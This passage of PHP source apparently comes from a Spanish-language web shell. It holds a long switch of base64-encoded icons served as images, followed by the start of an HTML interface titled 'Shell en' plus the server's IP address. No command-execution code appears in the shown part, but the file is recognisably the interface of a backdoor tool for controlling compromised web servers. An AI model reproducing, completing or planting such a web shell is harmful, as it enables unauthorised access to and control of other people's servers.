        case'bajar':$img='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEgAACxIB0t1+/AAAABx0RVh0U29mdHdhcmUAQWRvYmUgRmlyZXdvcmtzIENTM5jWRgMAAAAVdEVYdENyZWF0aW9uIFRpbWUAMi8xNy8wOCCcqlgAAAQRdEVYdFhNTDpjb20uYWRvYmUueG1wADw/eHBhY2tldCBiZWdpbj0iICAgIiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+Cjx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDQuMS1jMDM0IDQ2LjI3Mjk3NiwgU2F0IEphbiAyNyAyMDA3IDIyOjExOjQxICAgICAgICAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp4YXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iPgogICAgICAgICA8eGFwOkNyZWF0b3JUb29sPkFkb2JlIEZpcmV3b3JrcyBDUzM8L3hhcDpDcmVhdG9yVG9vbD4KICAgICAgICAgPHhhcDpDcmVhdGVEYXRlPjIwMDgtMDItMTdUMDI6MzY6NDVaPC94YXA6Q3JlYXRlRGF0ZT4KICAgICAgICAgPHhhcDpNb2RpZnlEYXRlPjIwMDgtMDMtMjRUMTk6MDA6NDJaPC94YXA6TW9kaWZ5RGF0ZT4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyI+CiAgICAgICAgIDxkYzpmb3JtYXQ+aW1hZ2UvcG5nPC9kYzpmb3JtYXQ+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4bXBtZXRhPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDUdUmQAAAE7SURBVDiNpZM7TsNAEIb/8WPNwwJKh5qGBiNxAiqa+AjQ5iCufQBaOILTUHEBIyEaGmoIVAkyEHshQ7HedSzbUiSvtNqZ0fzfzmhniZkxZFmD1AAcbRCRCQYpdZY1i9gk6cqdrkQAuD1n5H/K9m3g8p4683oBH7/AolT2vujLWgMEKaUAxtp/l8C8AizJ5OjWpgAiACDdy2hq8dVZs/XFd1XBTvPWmwfC23hFDQARIUiJL05qSP6lTn+3Ft89EWYR17p1gC7z9FjFlp8qtrWn/MdnMi/RC9CQwyPGaq5i1gHj9YU6n7EToCHbvrJ/8uYMbATQEKAtbgAqP2qpN1jMnOo5GGVZdu26LjzPgxACQgh4ngdmhpSytcMwnJgKkiRhKSWKokBZluYsSzVJjuPAtm2ztR/HMdHQ7/wPj7WgYLMWxPQAAAAASUVORK5CYII=';break;
        case'editar':$img='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAH8SURBVDjLjZPfS1NhGMdXf0VEQhDUhdCN4X0IYT8ghIJQM0KoC4vushZddLELKyRhQQkSFIKEGEkUCI2oxVhepG5zi1xbc0u3cDs7Z+ec/ezT+x62scmmHvhwDrzP93Pe57znsQE2cR0SdAm6d+GwYL/M1LBVBV35fF4plUqVcrlMK8Q6TqdzYrukJuiW4Vwuh67rdbLZLJlMhmQyaUnigVlC05f4+dbB0tQplp92DsnwPimQBaZpUigUrLtE0zQURSGVSqHF37DhGkVZeQdagszKLJ7HvZtNAhmuIQWGYaCqKps/ZkivPqCwPs/Gp0cYvjnKUTe+F9fMJoFoo96zfJZ9K+sLpP33qRhujPANtr7dJPhqmO/PBxX3+PljTYLtqImPpH13qZge9LUrmLEB1FU7sZd9jJw5MljNthYk/KLnxdFqeAjzdz9Z/z3Ck2fRE36qx9pakAjME1y4Lbb9GTMyTD52GUXsZO3ZadTkL6umrSD4ZZrAezvLH54Q915EjwywtXSH8FQf+t+I9V12FLwe6wE1SmjyAi77Qb6Kt3rGe9H+hKzwrgLH9eMUPE4K3gm8jpPMjRwlHfNTLBbr7Cjo7znA2NVOXA/PsThzi2wyah1pI+0E/9rNQQsqMtM4CyfE36fLhb2ERa0mB7BR0CElexjnGnL0O2T2PyFunSz8jchwAAAAAElFTkSuQmCC';break;        
        case'engranaje':$img='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAA3RJREFUOI1dU01II2cAfd/8OTOJm6RtiqZiotGtMTkVBJuDCD1Uy2pdoWChx1IPZY/t9tD25IKrUCjYQlEJ9FDogpT0YA9CgwjRaCWGkUSMWp0iozHTbH7czJfJZHqp0O47vcN77/LeI3gJY2NjzMjICCvL8quhUOhTACSXyy2pqqqn02krkUi0/qsnd4RhGCwvL/cHg8GnzWbzVlGUX6PR6DMAdjKZ/DAYDL7ndDrv5fP5x7Ozs8d3Pg4AeJ6HaZoMgM88Hs9D27btSCTyliiKAEDC4fDXXq83xDAMstmsDuATAC0AYABgaWnpzY2NjSdbW1uHAGyHw0H8fv8gpRSUUgQCgUGn00kAIJPJKKlU6kksFhsAANLd3c2tra390tHR8cAwjJYoiuT8/JzkcjnbsiwQQsAwDAmFQggEArZpmjbP80yhUFifnp5+n2NZVt7f32+fnJy0PR4Pc6GqOD09tTVNy+3s7DwDgOHh4Q8EQRiUZZn4/X7SaDTsvb09J8uyDnZxcdFVLBbLgiAMBQIBVzqdRqVSuZ6fn3+QyWTWTk5ONhVF+X10dHTaNM32/v77ODg4uMzn84vj4+PnXG9v75cTExOPJEkCpRSEEBiGkbq5uTkGYAOArut5wzBSDMM8pJRiaGioKxKJ/JjNZr/jVFXlBUGwBUEgDqcTkiTB5/M5Xt6Hz+dzSpKE68I1Xtze2pRSqKrKs5qmXSuKcun1eu973O57baIIl8v1RjQaTcXj8T8ZhsHKyso7fX19X0iyzLUsC4eHh1osFvsmkUj8TGZmZtqmpqaWRVH8SJIk4nK7wfM82gTBtCzrDwA2y7JDtNHgm2YTlUoZtVrNLhaLP8Xj8Y+59fV1LhwOB7u6ulCtVm3DMOByuQnrdvOCwL8NAA3TRLVaRaVctiuVCizLwtXVVe/m5ibHUkrNVqv1V71efyWRSPwWDAaH6/UX5PnzEkqlEnRdx02hgHK5jFKphNXV1W8ppfru7u7i8fFx7u4LDABxbm5uXpblRxzH2ZqmFf1+vxeAfXFxUfT5fK81m01omvb9wsLC5wAMAC323wAbQLNer0MUxbCu6yeKoix3dna+SylFMpn8yrIsqVQqlbe3t3+4vLzM3VVM8H8Qnudfb29v53p6etwDAwNPAZCjo6PHZ2dnf9dqNcs0zcKdGQD+AcMCoOvccxQRAAAAAElFTkSuQmCC';break;
        case'servidor':$img='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAkJJREFUeNqMU01IFVEU/u7M6BsdzEdIRYKFf2hBy/7BFm3auGhe0MpVQbpp1yISiiCCWrXRbdBKfHtBhIgIlCCSpBKy5wv7sVePDGVm7l/n3nlvngvF7nDnzpx7vu9855x7mdYajDHcn5yeps9QQ6M+mHkYiuM3CgXsMCzWvO4R+GjX4fDggQ5r1BYMS/xjvYJS+Wvx7uiVwk4EnvngCQ/Di6cgEkHGhgPh4Z3owcPJqRC7DEuglEZM4IX3ZcNrpdd1nBzson2FPQgkhJToyO+Hw2qhCW9gxi7lXgTkLITE7MsFOA6z+WurAhgZPg+u9K4Etoi3Hj3VYyPDqG7CEhjpklT9/FbC2loJSupUlSXWpNKZuHb18lhWREXGhKTOvHidKmAOAmyg+0gnzp4+B89rytoqpMBqeXV04tnUEJmO12qgkCQcly6csTVgjou5mSIG+wewXvlN6fFGzkTW39uHj8vLx7IamN5xoTD7at723iECxRXiaAt93Z0WxIVAk+sRmUDlV5UCiu1dUIgoykDvoYzg7fwnfC5/wXc6SEFrG4KgFVEUY3PrL+I4AqeUGwQ0k5jbTpgWuC5sRNd1iMyxdUnX2iS7FKkCB6kEJARu8dspG4WW3D5wzuGSc53EKEv/XVpd2t9GoCmqaVvMN6xDlPxBW3sei+8+QHCJXC4H38/R2kzKJN4sLpHiZCU7B9dvP37e7AdDun4RWCrZBycHDq1UdsGMnYo79+TBnZvkv8Rq17mH9vL4/1GluWKw/wQYABKpIQVMFZToAAAAAElFTkSuQmCC';break;
        case'servidor2':$img='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';break;
        case'guardar':$img='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAH+SURBVBgZBcE9i11VGAbQtc/sO0OCkqhghEREAwpWAWUg8aMVf4KFaJEqQtAipTZWViKiCGOh2Ap2gmJhlSIWFsFOxUK0EsUM3pl79n4f12qHb3z3Fh7D83gC95GOJsDe0ixLk5Qq/+xv/Lw9Xd+78/HLX3Y8fXTr2nWapy4eCFKxG7Fby97SnDlYtMbxthyfzHO//nl85fNvfvnk8MbX5xa8IHx1518Vkrj54Q+qQms2vVmWZjdiu5ZR2rT01166/NCZg/2PFjwSVMU6yjoC1oq+x6Y3VbHdlXWExPd379nf7Nmejv2Os6OC2O4KLK0RNn3RNCdr2Z5GJSpU4o+/TkhaJ30mEk5HwNuvX7Hpi76wzvjvtIwqVUSkyjqmpHS0mki8+9mPWmuWxqYvGkbFGCUAOH/+QevYI9GFSqmaHr5wkUYTAlGhqiRRiaqiNes6SOkwJwnQEqBRRRJEgkRLJGVdm6R0GLMQENE0EkmkSkQSVVMqopyuIaUTs0J455VLAAAAAODW0U/GiKT0pTWziEj44PZ1AAAAcPPqkTmH3QiJrlEVDXDt0qsAAAAAapa5BqUnyaw0Am7//gUAAAB49tEXzTmtM5KkV/y2G/X4M5fPao03n/sUAAAAwIX7y5yBv9vhjW/fT/IkuSp5gJKElKRISYoUiSRIyD1tufs/IXxui20QsKIAAAAASUVORK5CYII=';break;
        case'resetear':$img='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAn1JREFUeNqkU81rE0EUf/Ox2XwhJFYSGsEIWj8oLTQ5qRf/A8UeLJUePCh4sX+Ah/wJ9qZQBWtAQfFQ0JNQQfBiIljBxg/Umra0WELN5mNnZ3fWN5td2oP24sJvZ+a9eb/5zXtviO/78D8fP3unCYxzoJQWCSEzaCsj8gi6T1wdD74eEISG8waHyumjqZHhoXjGjDETAmE+KIV/VKmF6tEwCDx7tbWrAI1FTlXl3PjBiTg30oAByhtcaxA4IFHKD0AIBVfKXQJczJw6ceA4B5ZWvlJfmzsb39asVrfvyX/px6vWdwkcp5zLJrKuq+B7s7Wx3Gg9wg1zlLH1vUHRqdwwMDtUkwzWUog8I8T08L6NL9st13HncNM6MBZsUJ4HotfTAXdx+brf6VSNWAw8tGsfl44DjlTguT5IR4KwBXStNkjhBAS6QmYioaclDZ2TntWuOrhPq6JS2Judji0sS8LhXDLrOuImMhci6Z7rgt3tIqEN16bHS+ifRZIrkZ8iU221ud1qWjbY6dRw4Uh2ijPyAvNZi4AkNX3iymYPLlyaKKG6WQhJSP7G82LM5A+KZ0YnfvrJNKUEMgkGJidgMAKmBs5jOK79lrC6I2EsZ8L7J0u6Erc4JuNHty0qn5beVTKjx0bcQiHzi8VN5RNQLiZRQtBE2ArQ9zgIzEcDbZj8QUlT5SkwxyZ1Qop4t31b2Z++XEpicfoLj+tYlduMsSqJnOb4JPjq7w+LHjoJZGikFr86U7LvLwTB3spiVSw/BU1AwtNY+Db2gkZKjIvzi4GKrQ/33DdzD3Gq6yyjx6SDY4h4CDMcjdAH3tbHzyDab1V9/iUu0whLN+gfAQYAZRRB05u7/IgAAAAASUVORK5CYII=';break;
        case'nombre':$img='R0lGODlhEAAQANUvAP////r7/fj6++/z98kdAPH1+PT2+e3x9unv85kAAP8zAPb4+nqHkyczPiYyPm54g/D0+O7y9mVwevX4+nB6hzA7RoKNmv7+/3N+io6apXqGkyk1QDQ/SWNtd2t1geju8nWBjXqGkmhzfunv9DdCTWZveuvw9Orv8+zw9fP1+XyIlXiDkYuXoyUxPoyYo////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAC8ALAAAAAAQABAAAAadwJdw+MpkiEgiCwBwJS0qBkOzYjJXGqnKErJaLxcvMwQCBM6Es1oNAGEAAgFBHq/HARgKYLJQEBQLCwR/CxMAFA8AKQYEjAaPBgoGKQAPHgAQBQmaBZ0KnRAAHiIAEQOnqASoEQAiEgAoB7KzCbUHKAASHQAfCL4nJiYnvggfAB0lYgAjI8olFRsNDQ4tXg4O0hsVSRxMHEngJCTgQQA7';break;
        case'plugin':$img='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAn5JREFUOI11kj1oFEEUx/9zu3e3ubskaj48PSQeqIgICREJggFBSKMSQdFGCy0EK8UihU0sLCys7WwEyxRqYSViREgiGCWKKCgmxugll+ztzc7e7szOPIuLl7tgXjMzb+b/e1/DsIVdeT6Qy+f2P+jvGR41IOe3v/DxXenFrcen3r9qfmdvBQhjXD1WuHj5cNcguOLY1e4OzpRm7gM4uiXgwpOBIgEFIiipyJkpTSKf2wNfccyVZ1ELq8tnJvpHCJBEgDH4wJoB558Nvbx55O6JMK6BMQvZVCc85cFXHKEOKDYKXrTGqtKDJ13MLkyNt2SQtnLp3mwBVVWBUD5WZQki5hCxDz/mTMQcQnEI7SNCBKko2Qxgjp3tqKgVcOVBxD5EzBFoDqHrImE4AuKQTCJEAKWJ2emuJE4/PH4nnWgrdGfzeytquSEKjI/ArK/EoRBSRBy+9qBIQmkwe+DegZHRQ+fGd3fshDKKfFNGYDhqVBeFJBDAgyAPwlTx9Yf4WS3HU067dVCsyrc2JdhQRzaJGlbhmwrztQs/duHrCgJdL8GQBmOAxQjllXhi7vqnMQAWAGlHkhJvSk9JgdcnQi2DASMLFiwAgGUIlEhk8rf3OYltyczS2Odlu7oUTX/742J7JklhbNDZZgEAA9UB1AQjAMX8jkvF3txZL+IpcS0oWpXJtXnRl3bnF4PvlEr35TKJrNLElCZITVCaoOKNvZNCMuPorDTSWRTq9b98GYDU8KOT0909UT9oIzI1hwc1zoE0NDXn3rCbrmMyKeUGouHZDKGmeqQ2TGl0tfzEL6VfFSdKgKhVRBsJNPyGABWZuLXlQDeAjvWS/mebe7ryF/ckhT7Z/Q+GAAAAAElFTkSuQmCC';break;
        case'plugin2':$img='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';break;
        default:header('Location: ?inicio');break;
    }
    header("Content-type: image/gif");
    echo base64_decode($img);
    exit();
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <link rel="shortcut icon" href="http://<?php echo $script;?>?imagen::icono" />
    <title>Shell en <?php echo gethostbyname($_SERVER["HTTP_HOST"]); ?></title>
    <style type="text/css">
        *{padding:0;margin:0;border:0;}
        body{background:url(http://<?php echo $script;?>?imagen::fondo1) repeat;font-size:12px;font-family:tahoma;}
        input,select,option{background:url(http://<?php echo $script;?>?imagen::fondo2) repeat-x;font-size:12px;padding:3px;border:solid 1px #369;}
